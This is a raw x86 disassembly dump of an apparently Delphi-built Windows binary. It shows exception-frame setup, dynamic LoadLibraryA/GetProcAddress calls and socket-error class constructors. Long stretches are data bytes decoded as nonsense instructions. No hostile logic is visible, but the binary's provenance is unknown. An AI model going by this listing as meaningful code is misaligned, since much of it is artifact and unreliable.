arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
ror al 0xf8
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
cli
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
cld
stc
inc ebp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
clc
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
outsd
outsb
insb
clc
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 + 0x45 ] ch
add [ eax + eax ] cl
add [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 + 0xc0045 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
jno r-xdata
inc eax
add [ eax - 0x6 ] ah
stc
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] ah
jae r-xdata
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
stc
inc ebp
add [ eax + eax ] cl
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb eax [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xf92cc08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
popad
imul ebp [ ebp + 0x64 ] r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
cli
dec ecx
outsb
je r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc [ ebp + 0x49 ] eax
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
sti
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
push 0x6f727245
jb r-xdata
inc ebp
inc eax
add [ eax + 0x17004032 ] dl
jae r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x14004032 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
popad
imul ebp [ ebp + 0x64 ] 0x45f9fc90
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
ror [ ebx + edi * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 + 0xc0045 ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
outsb
inc ebp
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 ] ch
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
outsd
jb r-xdata
outsd
jb r-xdata
jb r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
inc ebp
jb r-xdata
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
pop ss
enter 0x45fa 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x45fa 0x0
or al 0x0
jb r-xdata
rcl al 0xfc
jb r-xdata
shl [ eax - 0x4 ] 0x45
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
jb r-xdata
insb
inc ebp
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
cld
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
mov eax eax
outsd
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x21004032 ] dl
inc ebp
dec ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4 ] ah
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
and [ ebp + 0x49 ] eax
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
clc
outsd
jae r-xdata
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
inc eax
je r-xdata
sar ah 0x1
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
and al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc eax
std
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
hlt
shl [ eax ] 0xfe
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc [ ebp ]
or al 0x0
add [ eax ] al
and al bh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
inc [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dh bh
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
push esp
jb r-xdata
outsb
push edx
jne r-xdata
outsd
add [ 0x53644945 ] bl
jb r-xdata
outsd
push esp
xor al [ eax ]
nop
xor al [ eax ]
and al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
jb r-xdata
popad
nop
jb r-xdata
nop
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc eax
add [ ebp + edi * 8 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xfd
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
inc ebp
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb eax 0x53644945
outsd
outsb
outsb
jb r-xdata
jb r-xdata
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
inc ebp
jb r-xdata
mov dh bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045fe ] cl
add [ eax ] al
add [ eax ] ah
clc
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
inc [ ebp ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
push esp
dec esp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh bh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
and al bh
outsd
pop ebx
pop ebp
retn 0x4
jb r-xdata
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc [ ebp + 0x49 ] al
dec ecx
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
lea eax [ eax ]
push eax
inc [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
inc [ ebp ]
adc [ eax ] al
add [ eax ] al
jae r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 + 0x45 ] dl
add [ eax ] dl
add [ eax ] al
add al dh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
lodsb [ esi ]
inc [ ebp ]
push cs
inc ebp
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
[ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ ebp ]
sub_45ff64
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b63c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_45ffac
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b63c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_45fff4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_460019
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460020
retn
sub_46002c
inc esi
dec eax
add cl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax + 0x640000fe ] dh
inc esi
dec eax
add [ ecx + 0x640000fe ] dh
inc esi
dec eax
add [ edx + 0x640000fe ] dh
inc esi
dec eax
add [ ebx + 0x640000fe ] dh
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] dh
dec eax
add [ ebp + 0x640000fe ] dh
inc esi
dec eax
add [ esi + 0x640000fe ] dh
inc esi
dec eax
add [ edi + 0x640000fe ] dh
inc esi
dec eax
add [ eax + 0x640000fe ] bh
inc esi
dec eax
add [ ecx + 0x640000fe ] bh
inc esi
dec eax
add [ edx + 0x640000fe ] bh
inc esi
dec eax
add [ ebx + 0x640000fe ] bh
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] bh
dec eax
add [ ebp + 0x640000fe ] bh
inc esi
dec eax
add [ esi + 0x640000fe ] bh
inc esi
dec eax
add [ edi + 0x640000fe ] bh
inc esi
dec eax
add [ eax + 0x640000fe ] ah
inc esi
dec eax
add [ ecx + 0x640000fe ] ah
inc esi
dec eax
add [ edx + 0x640000fe ] ah
inc esi
dec eax
add [ ebx + 0x640000fe ] ah
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] ah
dec eax
add [ ebp + 0x640000fe ] ah
inc esi
dec eax
add [ esi + 0x640000fe ] ah
inc esi
dec eax
add [ edi + 0x640000fe ] ah
inc esi
dec eax
add [ eax + 0x640000fe ] ch
inc esi
dec eax
add [ ecx + 0x640000fe ] ch
inc esi
dec eax
add [ edx + 0x640000fe ] ch
inc esi
dec eax
add [ ebx + 0x640000fe ] ch
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] ch
dec eax
add [ ebp + 0x640000fe ] ch
inc esi
dec eax
add [ esi + 0x640000fe ] ch
inc esi
dec eax
add [ edi + 0x640000fe ] ch
inc esi
dec eax
add [ eax + 0x550000fe ] dl
mov ebp esp
xor eax eax
push ebp
push sub_4602d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602d8
retn
sub_46035c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4603fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_4040c8
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40ae34
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_4040c8
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4043f4
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b63c
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b63c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460403
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404098
retn
sub_460403
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4611e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_461283
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46128a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408dbc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46035c
call sub_403a2c
sub_461294
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_4612b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_461385
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408dbc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46035c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46138c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_4613c3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4613f0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4613f7
retn
call sub_460434
sub_46140c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_461431
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461438
retn
sub_461445
adc al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4004614 ] ah
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ 0x53644954 ] cl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ebp + ebx + 0x2aa80046 ] bl
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
call 0xffffffffa8465b24
sub al [ eax ]
test al 0x2a
inc eax
